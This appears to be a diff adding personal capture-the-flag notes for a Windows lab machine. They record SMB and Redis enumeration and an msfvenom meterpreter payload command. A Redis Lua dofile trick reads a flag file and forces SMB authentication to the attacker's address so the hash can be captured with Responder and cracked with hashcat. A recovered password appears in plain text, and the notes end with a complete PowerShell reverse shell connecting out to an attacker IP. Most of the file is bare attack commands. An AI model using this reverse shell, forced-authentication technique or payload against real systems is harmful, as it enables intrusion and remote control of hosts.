@@ -1,0 +1,87 @@
+What I tried: 
+
+nmap -Pn
+enum4linux -a
+- Target information (known usernames)
+- Enumeration Workgroup/Domain (no info)
+- NBstat information
+- Session Check: allows username '', password ''
+- Getting Domain SID: (Host is part of a fomain: VULNET)
+- Share Enumeration: SMB1
+
+smbmap -H <host> -u '' -p ''
+smbclient -L \\\\<host>\\
+	- Anonymous login successful
+	- SMB1 share disabled
+
+Fromt THM Print Nightmare Room
+Download CVE-2021-1675.py
+Download Impacket
+metasploit
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll --> Error
+
+Redis:
+The Redis command line interface (redis-cli) is a terminal program used to send commands to and read replies from the Redis server.
+https://redis.io/docs/ui/
+
+nmap -Pn 10.10.114.220 -sV -p-
+
+-Pn --> treat host as online
+-sV --> Probe open ports to determine service/version info
+-p- --> scan all ports
+
+
+https://lzone.de/cheat-sheet/Redis
+Config get *
+gives you a list of all active configuration variables you can change.
+
+responder: Responder is one of the most common tools used during an internal penetration test as a first attempt to get a foothold into a Windows network
+The Responder penetration testing tool is a Link Local Multicast Name Resolution (LLMNR), NBT-NS, and MDNS poisoner. An example is if a target sends out an LLMNR request looking for a resource, the Responder tool will send a response to the server directing all traffic to the malicious user.
+
+https://www.virtuesecurity.com/kb/responder-multirelay-pentesting-cheatsheet/
+
+redis-cli -h 10.10.122.139
+
+redis-cli commands:
+Info (info over machine)
+config get *
+
+https://redis.io/commands/eval/
+
+Invoke the execution of a server-side Lua script.
+
+The first argument is the script's source code. Scripts are written in Lua and executed by the embedded Lua 5.1 interpreter in Redis.
+The second argument is the number of input key name arguments, followed by all the keys accessed by the script.
+
+Example: 
+
+> EVAL "return ARGV[1]" 0 hello
+"hello"
+
+https://tex.stackexchange.com/questions/464056/lualatex-difference-between-dofile-and-require-when-loading-lua-files
+
+dofile: 
+
+tl;dr require is cached, dofile isn't.
+
+In contrast to dofile, require caches which files have been requested already. For example, if you load a module example
+
+eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+
+eval "dofile('//10.18.80.62/nothing')" 0
+
+hashcat -m 5600 hash rockyou.txt
+
+smbclient -L //10.10.88.188 -U enterprise-security --password=sand_0873959498
+
+smbclient //10.10.88.188/Enterprise-Share -U enterprise-security --password=sand_0873959498
+dir
+
+$client = New-Object System.Net.Sockets.TCPClient('10.11.69.106',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+
+
+
+
